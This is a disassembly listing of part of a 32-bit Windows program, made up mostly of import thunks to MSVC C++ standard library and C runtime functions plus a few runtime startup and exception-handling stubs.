jmp [ eax + 0x4 ]
sub_42e30d
push esi
mov esi ecx
lea ecx [ esi + 0x10 ]
call sub_401080
mov eax esi
pop esi
retn
j_sub_42e2cb
jmp sub_42e2cb
InitCommonControlsEx
jmp [ InitCommonControlsEx@IAT ]
j_sub_42e3bc
jmp sub_42e3bc
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
??Y?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@PB_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@ABV01@@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@XZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEPB_WXZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::c_str@IAT ]
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@PB_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
?c_str@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEPBDXZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@PBD@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
?compare@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEHPB_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
??Y?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@ABV01@@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
?clear@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXXZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::clear@IAT ]
??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
jmp [ ??$?MDU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@PB_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator=@IAT ]
?_Unlock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEXXZ
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::_Unlock@IAT ]
?rdbuf@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_streambuf@DU?$char_traits@D@std@@@2@XZ
jmp [ std::basic_ios<char,struct std::char_traits<char> >::rdbuf@IAT ]
?_Unlock@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEXXZ
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Unlock@IAT ]
?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QBEPAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ
jmp [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::rdbuf@IAT ]
?_Lock@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEXXZ
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::_Lock@IAT ]
?_Lock@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEXXZ
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::_Lock@IAT ]
??1_Lockit@std@@QAE@XZ
jmp [ std::_Lockit::~_Lockit@IAT ]
?_Register@facet@locale@std@@QAEXXZ
jmp [ std::locale::facet::_Register@IAT ]
?_Incref@facet@locale@std@@QAEXXZ
jmp [ std::locale::facet::_Incref@IAT ]
?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@@Z
jmp [ std::ctype<char>::_Getcat@IAT ]
?_Getfacet@locale@std@@QBEPBVfacet@12@I@Z
jmp [ std::locale::_Getfacet@IAT ]
??Bid@locale@std@@QAEIXZ
jmp [ std::locale::id@IAT ]
??0_Lockit@std@@QAE@H@Z
jmp [ std::_Lockit::_Lockit@IAT ]
?_Getcat@?$ctype@_W@std@@SAIPAPBVfacet@locale@2@@Z
jmp [ std::ctype<wchar_t>::_Getcat@IAT ]
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ID@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@D@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@I_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
??Y?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV01@_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator-=@IAT ]
?_Ipfx@?$basic_istream@DU?$char_traits@D@std@@@std@@QAE_N_N@Z
jmp [ std::basic_istream<char,struct std::char_traits<char> >::_Ipfx@IAT ]
?_Ipfx@?$basic_istream@_WU?$char_traits@_W@std@@@std@@QAE_N_N@Z
jmp [ std::basic_istream<wchar_t,struct std::char_traits<wchar_t> >::_Ipfx@IAT ]
?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
jmp [ std::basic_ostream<char,struct std::char_traits<char> >::flush@IAT ]
?tie@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEPAV?$basic_ostream@DU?$char_traits@D@std@@@2@XZ
jmp [ std::basic_ios<char,struct std::char_traits<char> >::tie@IAT ]
?good@ios_base@std@@QBE_NXZ
jmp [ std::ios_base::good@IAT ]
?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
jmp [ std::basic_ostream<char,struct std::char_traits<char> >::_Osfx@IAT ]
?uncaught_exception@std@@YA_NXZ
jmp [ std::uncaught_exception@IAT ]
?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QAEAAV12@XZ
jmp [ std::basic_ostream<wchar_t,struct std::char_traits<wchar_t> >::flush@IAT ]
?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QBEPAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ
jmp [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::tie@IAT ]
?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QAEXXZ
jmp [ std::basic_ostream<wchar_t,struct std::char_traits<wchar_t> >::_Osfx@IAT ]
?width@ios_base@std@@QAEHH@Z
jmp [ std::ios_base::width@IAT ]
?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXH_N@Z
jmp [ std::basic_ios<char,struct std::char_traits<char> >::setstate@IAT ]
?snextc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::snextc@IAT ]
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ID@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
?is@?$ctype@D@std@@QBE_NFD@Z
jmp [ std::ctype<char>::is@IAT ]
?to_char_type@?$char_traits@D@std@@SADABH@Z
jmp [ std::char_traits<char>::to_char_type@IAT ]
?eq_int_type@?$char_traits@D@std@@SA_NABH0@Z
jmp [ std::char_traits<char>::eq_int_type@IAT ]
?eof@?$char_traits@D@std@@SAHXZ
jmp [ std::char_traits<char>::eof@IAT ]
?sgetc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::sgetc@IAT ]
?max_size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::max_size@IAT ]
?width@ios_base@std@@QBEHXZ
jmp [ std::ios_base::width@IAT ]
?erase@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@II@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::erase@IAT ]
??1locale@std@@QAE@XZ
jmp [ std::locale::~locale@IAT ]
?getloc@ios_base@std@@QBE?AVlocale@2@XZ
jmp [ std::ios_base::getloc@IAT ]
?size@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIXZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
?sbumpc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHXZ
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::sbumpc@IAT ]
?to_int_type@?$char_traits@D@std@@SAHABD@Z
jmp [ std::char_traits<char>::to_int_type@IAT ]
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEABDI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QAEHD@Z
jmp [ std::basic_streambuf<char,struct std::char_traits<char> >::sputc@IAT ]
?fill@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDXZ
jmp [ std::basic_ios<char,struct std::char_traits<char> >::fill@IAT ]
?flags@ios_base@std@@QBEHXZ
jmp [ std::ios_base::flags@IAT ]
?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QAEXH_N@Z
jmp [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::setstate@IAT ]
?snextc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEGXZ
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::snextc@IAT ]
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@I_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
?is@?$ctype@_W@std@@QBE_NF_W@Z
jmp [ std::ctype<wchar_t>::is@IAT ]
?to_char_type@?$char_traits@_W@std@@SA_WABG@Z
jmp [ std::char_traits<wchar_t>::to_char_type@IAT ]
?eq_int_type@?$char_traits@_W@std@@SA_NABG0@Z
jmp [ std::char_traits<wchar_t>::eq_int_type@IAT ]
?eof@?$char_traits@_W@std@@SAGXZ
jmp [ std::char_traits<wchar_t>::eof@IAT ]
?sgetc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEGXZ
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sgetc@IAT ]
?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::max_size@IAT ]
?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@II@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::size@IAT ]
?sbumpc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEGXZ
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sbumpc@IAT ]
?to_int_type@?$char_traits@_W@std@@SAGAB_W@Z
jmp [ std::char_traits<wchar_t>::to_int_type@IAT ]
??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEAB_WI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::operator[]@IAT ]
?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QAEG_W@Z
jmp [ std::basic_streambuf<wchar_t,struct std::char_traits<wchar_t> >::sputc@IAT ]
?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QBE_WXZ
jmp [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::fill@IAT ]
?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z
jmp [ std::basic_ios<char,struct std::char_traits<char> >::widen@IAT ]
?widen@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QBE_WD@Z
jmp [ std::basic_ios<wchar_t,struct std::char_traits<wchar_t> >::widen@IAT ]
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@ABV12@@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@PB_W@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
??$?8_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA_NABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@PB_W@Z
jmp [ ??$?8_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA_NABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@PB_W@Z@IAT ]
?substr@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBE?AV12@II@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::substr@IAT ]
??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV01@@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBDI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@PBD@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBD@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z
jmp [ ??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z@IAT ]
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIPBDI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAADI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
??_D?$basic_ostringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXXZ
jmp [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::`vector deleting destructor'@IAT ]
?str@?$basic_ostringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
jmp [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::str@IAT ]
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@H@Z
jmp [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
??0?$basic_ostringstream@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@H@Z
jmp [ std::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >::basic_ostringstream<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@PBD@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::append@IAT ]
?assign@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@ABV12@II@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBEIDI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z
jmp [ ??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z@IAT ]
??_D?$basic_ofstream@DU?$char_traits@D@std@@@std@@QAEXXZ
jmp [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
?close@?$basic_ofstream@DU?$char_traits@D@std@@@std@@QAEXXZ
jmp [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV01@P6AAAV01@AAV01@@Z@Z
jmp [ std::basic_ostream<char,struct std::char_traits<char> >::operator<<@IAT ]
??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
jmp [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z@IAT ]
??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@D@Z
jmp [ ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@D@Z@IAT ]
?endl@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@1@AAV21@@Z
jmp [ std::endl@IAT ]
??0?$basic_ofstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z
jmp [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
?rfind@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEI_WI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEAAV12@PB_WI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::append@IAT ]
?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::length@IAT ]
?rfind@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIPB_WI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::rfind@IAT ]
?erase@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE?AViterator@12@V312@@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::erase@IAT ]
?end@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE?AViterator@12@XZ
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::end@IAT ]
?insert@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@IID@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::insert@IAT ]
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBDI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
?resize@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEXI@Z
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z
jmp [ ??$?9DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBD@Z@IAT ]
?end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE?AVconst_iterator@12@XZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
?begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QBE?AVconst_iterator@12@XZ
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAE@PB_WI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
?resize@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QAEXI@Z
jmp [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::resize@IAT ]
?_Unlock@_Mutex@std@@QAEXXZ
jmp [ std::_Mutex::_Unlock@IAT ]
?_Lock@_Mutex@std@@QAEXXZ
jmp [ std::_Mutex::_Lock@IAT ]
?clear@ios_base@std@@QAEXH_N@Z
jmp [ std::ios_base::clear@IAT ]
?_Nomemory@std@@YAXXZ
jmp [ std::_Nomemory@IAT ]
??_V@YAXPAX@Z
jmp [ `placement delete closure'@IAT ]
free
jmp [ free@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_42e6c0
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
jmp [ _onexit@IAT ]
sub_42e6e6
push [ esp + 0x4 ]
call sub_42e6c0
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
wcslen
jmp [ wcslen@IAT ]
sub_42e71b
xor eax eax
inc eax
retn
sub_42e72f
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_42e6fe
retn
sub_42e744
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_42e79a
mov eax ecx
retn 0x4
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
malloc
jmp [ malloc@IAT ]
??1exception@@UAE@XZ
jmp [ exception::~exception@IAT ]
??0exception@@QAE@XZ
jmp [ exception::exception@IAT ]
??0exception@@QAE@ABV0@@Z
jmp [ exception::exception@IAT ]
_purecall
jmp [ _purecall@IAT ]
sub_42e7c4
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp ?terminate@@YAXXZ
xor eax eax
retn
sub_42e87c
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42e7d6
sub_42e8de
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42e7d6
time
jmp [ time@IAT ]
_time64
jmp [ _time64@IAT ]
rand
jmp [ rand@IAT ]
srand
jmp [ srand@IAT ]
??0bad_cast@@QAE@ABV0@@Z
jmp [ bad_cast::bad_cast@IAT ]
??1bad_cast@@UAE@XZ
jmp [ bad_cast::~bad_cast@IAT ]
??0bad_cast@@QAE@PBD@Z
jmp [ bad_cast::bad_cast@IAT ]
memmove
jmp [ memmove@IAT ]
_vscwprintf
jmp [ _vscwprintf@IAT ]
vswprintf
jmp [ vswprintf@IAT ]
_mktime64
jmp [ _mktime64@IAT ]
_localtime64
jmp [ _localtime64@IAT ]
atoi
jmp [ atoi@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
?_set_new_handler@@YAP6AHI@ZP6AHI@Z@Z
jmp [ _set_new_handler@IAT ]
_set_purecall_handler
jmp [ _set_purecall_handler@IAT ]
?set_unexpected@@YAP6AXXZP6AXXZ@Z
jmp [ set_unexpected@IAT ]
?set_terminate@@YAP6AXXZP6AXXZ@Z
jmp [ set_terminate@IAT ]
_set_error_mode
jmp [ _set_error_mode@IAT ]
?_set_se_translator@@YAP6AXIPAU_EXCEPTION_POINTERS@@@ZP6AXI0@Z@Z
jmp [ _set_se_translator@IAT ]
?_set_new_mode@@YAHH@Z
jmp [ _set_new_mode@IAT ]
_wcsicmp
jmp [ _wcsicmp@IAT ]
_wtoi
jmp [ _wtoi@IAT ]
wcsstr
jmp [ wcsstr@IAT ]
sprintf
jmp [ sprintf@IAT ]
strrchr
jmp [ strrchr@IAT ]
swprintf
jmp [ swprintf@IAT ]
wcscpy
jmp [ wcscpy@IAT ]
mktime
jmp [ mktime@IAT ]
swscanf
jmp [ swscanf@IAT ]
wcsftime
jmp [ wcsftime@IAT ]
localtime
jmp [ localtime@IAT ]
_i64toa
jmp [ _i64toa@IAT ]
_ultoa
jmp [ _ultoa@IAT ]
_ui64toa
jmp [ _ui64toa@IAT ]
strftime
jmp [ strftime@IAT ]
atol
jmp [ atol@IAT ]
_atoi64
jmp [ _atoi64@IAT ]
wcsncpy
jmp [ wcsncpy@IAT ]
wcscat
jmp [ wcscat@IAT ]
wcsrchr
jmp [ wcsrchr@IAT ]
sub_42ed3d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x2c ] ecx
push eax
push ecx
call _XcptFilter
pop ecx
pop ecx
retn
sub_42ed51
mov esp [ ebp - 0x18 ]
mov esi [ ebp - 0x2c ]
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call [ _c_exit@IAT ]
or [ ebp - 0x4 ] 0xffffffff
mov eax esi
call sub_42eddf
retn
push esi
call [ _exit@IAT ]
sub_42ed78
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
